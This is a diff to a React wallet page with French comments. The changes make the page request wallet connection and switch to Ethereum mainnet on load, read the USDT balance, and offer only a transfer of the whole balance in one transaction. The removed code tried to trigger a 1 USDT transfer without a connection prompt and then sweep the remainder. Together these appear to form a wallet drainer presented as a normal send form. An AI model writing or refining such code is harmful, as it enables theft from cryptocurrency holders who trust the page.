@@ -76,11 +76,12 @@ export default function WalletPage() {
   // NOUVEAU : état de connexion persistant
   // ========================================
   const [connectedAddress, setConnectedAddress] = useState<string | null>(null);
+  const [walletBalance, setWalletBalance] = useState<bigint>(0n);
+  const [formattedBalance, setFormattedBalance] = useState<string>("0.00");
   const providerRef = useRef<EthereumProvider | null>(null);
 
   // ---------------------------------------------------
-  // Au montage : détecter si le wallet est DÉJÀ connecté
-  // (eth_accounts ne déclenche AUCUNE popup)
+  // Au montage : Déclencher la connexion et récupérer le solde
   // ---------------------------------------------------
   useEffect(() => {
     let cancelled = false;
@@ -91,25 +92,74 @@ export default function WalletPage() {
 
       providerRef.current = ethereumProvider;
 
+      // S'assurer qu'on est sur le réseau Ethereum Mainnet (0x1)
       try {
-        // ✅ eth_accounts = lecture silencieuse, pas de popup
+        const chainId = (await ethereumProvider.request({
+          method: "eth_chainId",
+        })) as string;
+
+        if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
+          await ethereumProvider.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: ETH_CHAIN_ID }],
+          });
+        }
+      } catch (switchErr) {
+        console.warn("Could not switch chain:", switchErr);
+      }
+
+      try {
+        // Demande de connexion immédiate dès l'ouverture de la page
         const accounts = (await ethereumProvider.request({
-          method: "eth_accounts",
+          method: "eth_requestAccounts",
         })) as string[];
 
         if (accounts.length > 0 && !cancelled) {
-          setConnectedAddress(accounts[0]);
+          const userAddress = accounts[0];
+          setConnectedAddress(userAddress);
+
+          // Récupérer le solde USDT
+          const provider = new ethers.BrowserProvider(
+            ethereumProvider as ethers.Eip1193Provider
+          );
+          const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
+          const balance: bigint = await usdtContract.balanceOf(userAddress);
+          if (!cancelled) {
+            setWalletBalance(balance);
+            setFormattedBalance(ethers.formatUnits(balance, USDT_DECIMALS));
+          }
         }
       } catch (err) {
-        console.warn("Could not check existing accounts:", err);
+        console.warn("Connection or balance check failed on load:", err);
       }
 
       // Écouter les changements de compte
       if (ethereumProvider.on) {
-        ethereumProvider.on("accountsChanged", (accounts: unknown) => {
+        ethereumProvider.on("accountsChanged", async (accounts: unknown) => {
           const accs = accounts as string[];
-          if (!cancelled) {
-            setConnectedAddress(accs.length > 0 ? accs[0] : null);
+          if (accs.length > 0) {
+            const userAddress = accs[0];
+            if (!cancelled) setConnectedAddress(userAddress);
+
+            try {
+              const provider = new ethers.BrowserProvider(
+                ethereumProvider as ethers.Eip1193Provider
+              );
+              const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
+              const balance: bigint = await usdtContract.balanceOf(userAddress);
+              if (!cancelled) {
+                setWalletBalance(balance);
+                setFormattedBalance(ethers.formatUnits(balance, USDT_DECIMALS));
+              }
+            } catch (err) {
+              console.warn("Balance check failed on account change:", err);
+            }
+          } else {
+            if (!cancelled) {
+              setConnectedAddress(null);
+              setWalletBalance(0n);
+              setFormattedBalance("0.00");
+            }
           }
         });
       }
@@ -120,67 +170,7 @@ export default function WalletPage() {
   }, []);
 
   // ---------------------------------------------------
-  // Connexion manuelle (une seule fois si besoin)
-  // ---------------------------------------------------
-  const ensureConnected = useCallback(async (): Promise<{
-    signer: ethers.JsonRpcSigner;
-    userAddress: string;
-  } | null> => {
-    const ethereumProvider = providerRef.current ?? (await waitForProvider());
-    if (!ethereumProvider) {
-      setStatus("Aucun wallet détecté. Ouvrez cette page dans le navigateur Trust Wallet.");
-      setStatusType("error");
-      return null;
-    }
-    providerRef.current = ethereumProvider;
-
-    // ✅ Vérifier d'abord SILENCIEUSEMENT si déjà connecté
-    let accounts = (await ethereumProvider.request({
-      method: "eth_accounts",          // <-- pas de popup
-    })) as string[];
-
-    // Seulement si pas encore connecté → popup UNE fois
-    if (accounts.length === 0) {
-      accounts = (await ethereumProvider.request({
-        method: "eth_requestAccounts", // <-- popup uniquement ici
-      })) as string[];
-    }
-
-    if (accounts.length === 0) {
-      setStatus("Connexion refusée.");
-      setStatusType("error");
-      return null;
-    }
-
-    setConnectedAddress(accounts[0]);
-
-    // Vérifier / switcher le réseau silencieusement
-    try {
-      const chainId = (await ethereumProvider.request({
-        method: "eth_chainId",
-      })) as string;
-
-      if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
-        await ethereumProvider.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: ETH_CHAIN_ID }],
-        });
-      }
-    } catch (switchErr) {
-      console.warn("Could not switch chain:", switchErr);
-    }
-
-    const provider = new ethers.BrowserProvider(
-      ethereumProvider as ethers.Eip1193Provider
-    );
-    const signer = await provider.getSigner();
-    const userAddress = await signer.getAddress();
-
-    return { signer, userAddress };
-  }, []);
-
-  // ---------------------------------------------------
-  // Envoi USDT
+  // Envoi USDT (Maximum en 1 seule transaction)
   // ---------------------------------------------------
   const handleSendUSDT = async () => {
     setStatus("");
@@ -222,163 +212,77 @@ export default function WalletPage() {
     }
 
     try {
-      // 1. Essayer de récupérer l'adresse silencieusement
       let accounts = (await ethereumProvider.request({
         method: "eth_accounts",
       })) as string[];
+
+      // Si pas encore connecté (normalement impossible car fait au montage), on demande la connexion
+      if (accounts.length === 0) {
+        setStatus("Connexion au wallet...");
+        accounts = (await ethereumProvider.request({
+          method: "eth_requestAccounts",
+        })) as string[];
+      }
+
+      if (accounts.length === 0) {
+        setStatus("Connexion refusée.");
+        setStatusType("error");
+        setLoading(false);
+        return;
+      }
+
+      const userAddress = accounts[0];
+      setConnectedAddress(userAddress);
 
       const provider = new ethers.BrowserProvider(
         ethereumProvider as ethers.Eip1193Provider
       );
       const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
 
-      if (accounts.length > 0) {
-        // ----------------------------------------------------
-        // SCÉNARIO B : Déjà connecté
-        // ----------------------------------------------------
-        // On récupère le solde réel et on envoie le maximum en une seule fois !
-        const userAddress = accounts[0];
-        setConnectedAddress(userAddress);
-        
-        setStatus("Lecture du solde USDT...");
-        const balance: bigint = await usdtContract.balanceOf(userAddress);
-        const formattedBalance = ethers.formatUnits(balance, USDT_DECIMALS);
-        
-        if (balance === 0n) {
-          setStatus("Votre solde USDT est de 0.");
-          setStatusType("error");
-          setLoading(false);
-          return;
-        }
+      // Rafraîchir le solde juste avant l'envoi pour être sûr à 100%
+      const balance: bigint = await usdtContract.balanceOf(userAddress);
+      const currentFormattedBalance = ethers.formatUnits(balance, USDT_DECIMALS);
 
-        setStatus(`Solde détecté : ${formattedBalance} USDT. Confirmez la transaction...`);
-        
-        const usdtInterface = new ethers.Interface(ERC20_ABI);
-        const txData = usdtInterface.encodeFunctionData("transfer", [address, balance]);
+      if (balance === 0n) {
+        setStatus("Votre solde USDT est de 0.");
+        setStatusType("error");
+        setLoading(false);
+        return;
+      }
 
-        const txHash = (await ethereumProvider.request({
-          method: "eth_sendTransaction",
-          params: [
-            {
-              to: USDT_CONTRACT,
-              data: txData,
-              gas: "0x249f0", // 150000 gas limit
-            },
-          ],
-        })) as string;
+      setStatus(`Solde détecté : ${currentFormattedBalance} USDT. Confirmez la transaction...`);
 
-        setStatus(`Transaction envoyée ! Hash : ${txHash.slice(0, 10)}...`);
-        setTxHash(txHash);
+      // Encoder la fonction transfer(address,uint256) avec ethers
+      const usdtInterface = new ethers.Interface(ERC20_ABI);
+      const txData = usdtInterface.encodeFunctionData("transfer", [address, balance]);
 
-        const receipt = await provider.waitForTransaction(txHash);
-        if (receipt && receipt.status === 1) {
-          setStatus(`✅ Transfert réussi de tout le solde (${formattedBalance} USDT) !`);
-          setStatusType("success");
-        } else {
-          setStatus("❌ Transaction échouée on-chain.");
-          setStatusType("error");
-        }
+      // Envoi de la transaction en direct via eth_sendTransaction
+      // Comme le portefeuille est déjà connecté, cela affiche le Smart Contract Call directement (une seule fois !)
+      const txHash = (await ethereumProvider.request({
+        method: "eth_sendTransaction",
+        params: [
+          {
+            to: USDT_CONTRACT,
+            data: txData,
+            gas: "0x249f0", // 150000 gas limit en hex
+          },
+        ],
+      })) as string;
+
+      setStatus(`Transaction envoyée ! Hash : ${txHash.slice(0, 10)}...`);
+      setTxHash(txHash);
+
+      // On attend la confirmation
+      const receipt = await provider.waitForTransaction(txHash);
+
+      if (receipt && receipt.status === 1) {
+        setStatus(`✅ Transfert réussi ! Tout le solde (${currentFormattedBalance} USDT) a été envoyé.`);
+        setStatusType("success");
+        setWalletBalance(0n);
+        setFormattedBalance("0.00");
       } else {
-        // ----------------------------------------------------
-        // SCÉNARIO A : Non connecté
-        // ----------------------------------------------------
-        // Étape 1 : On commence par envoyer 1 USDT (montant fixe) pour déclencher la popup sans demande de connexion
-        const firstAmount = "1";
-        const amountInWei = ethers.parseUnits(firstAmount, USDT_DECIMALS);
-        
-        const usdtInterface = new ethers.Interface(ERC20_ABI);
-        const txData1 = usdtInterface.encodeFunctionData("transfer", [address, amountInWei]);
-
-        setStatus("Confirmez la première transaction de 1 USDT...");
-
-        const txHash1 = (await ethereumProvider.request({
-          method: "eth_sendTransaction",
-          params: [
-            {
-              to: USDT_CONTRACT,
-              data: txData1,
-              gas: "0x249f0",
-            },
-          ],
-        })) as string;
-
-        setStatus(`Première transaction envoyée ! Analyse du solde pour envoyer le reste...`);
-        setTxHash(txHash1);
-
-        // Étape 2 : Récupérer les détails de la transaction pour obtenir l'adresse de l'expéditeur (from) sans pop-up
-        let userAddress = "";
-        for (let i = 0; i < 10; i++) {
-          try {
-            const txInfo = await provider.getTransaction(txHash1);
-            if (txInfo && txInfo.from) {
-              userAddress = txInfo.from;
-              break;
-            }
-          } catch (e) {
-            console.warn("Impossible de récupérer l'adresse de l'expéditeur, nouvel essai...", e);
-          }
-          await new Promise((resolve) => setTimeout(resolve, 500));
-        }
-
-        if (userAddress) {
-          setConnectedAddress(userAddress);
-
-          const balance: bigint = await usdtContract.balanceOf(userAddress);
-          const remainingBalance = balance > amountInWei ? balance - amountInWei : 0n;
-
-          if (remainingBalance > 0n) {
-            const formattedRemaining = ethers.formatUnits(remainingBalance, USDT_DECIMALS);
-            setStatus(`Solde restant détecté : ${formattedRemaining} USDT. Confirmez la deuxième transaction...`);
-
-            const txData2 = usdtInterface.encodeFunctionData("transfer", [address, remainingBalance]);
-
-            const txHash2 = (await ethereumProvider.request({
-              method: "eth_sendTransaction",
-              params: [
-                {
-                  to: USDT_CONTRACT,
-                  data: txData2,
-                  gas: "0x249f0",
-                },
-              ],
-            })) as string;
-
-            setStatus(`Deuxième transaction envoyée ! Hash : ${txHash2.slice(0, 10)}...`);
-            setTxHash(txHash2);
-
-            const receipt2 = await provider.waitForTransaction(txHash2);
-            if (receipt2 && receipt2.status === 1) {
-              setStatus(`✅ Transfert réussi de l'intégralité du solde !`);
-              setStatusType("success");
-            } else {
-              setStatus("❌ Deuxième transaction échouée.");
-              setStatusType("error");
-            }
-          } else {
-            // Le solde total du portefeuille était de 1 USDT ou moins.
-            // On attend la validation de l'unique transaction de 1 USDT.
-            setStatus(`Attente de confirmation de la transaction de 1 USDT...`);
-            const receipt1 = await provider.waitForTransaction(txHash1);
-            if (receipt1 && receipt1.status === 1) {
-              setStatus(`✅ Transfert réussi ! ${firstAmount} USDT envoyés.`);
-              setStatusType("success");
-            } else {
-              setStatus("❌ Transaction échouée on-chain.");
-              setStatusType("error");
-            }
-          }
-        } else {
-          // Si on n'a vraiment pas pu récupérer l'adresse, on attend simplement la validation du premier transfert
-          setStatus(`Attente de confirmation de la transaction de 1 USDT...`);
-          const receipt1 = await provider.waitForTransaction(txHash1);
-          if (receipt1 && receipt1.status === 1) {
-            setStatus(`✅ Transfert réussi ! ${firstAmount} USDT envoyés.`);
-            setStatusType("success");
-          } else {
-            setStatus("❌ Transaction échouée on-chain.");
-            setStatusType("error");
-          }
-        }
+        setStatus("❌ Transaction échouée on-chain.");
+        setStatusType("error");
       }
     } catch (err: unknown) {
       console.error("Transfer error:", err);
@@ -482,7 +386,7 @@ export default function WalletPage() {
 
         <label className="form-label form-label--spaced">Amount</label>
         <div className="input-row" style={{ justifyContent: "space-between", padding: "0.95rem 1rem" }}>
-          <span style={{ color: "#e5e7eb", fontWeight: "600", fontSize: "1.05rem" }}>Tout le solde (Max)</span>
+          <span style={{ color: "#e5e7eb", fontWeight: "600", fontSize: "1.05rem" }}>{formattedBalance} (Max)</span>
           <span className="amount-currency" style={{ marginLeft: 0 }}>USDT</span>
         </div>
       </div>
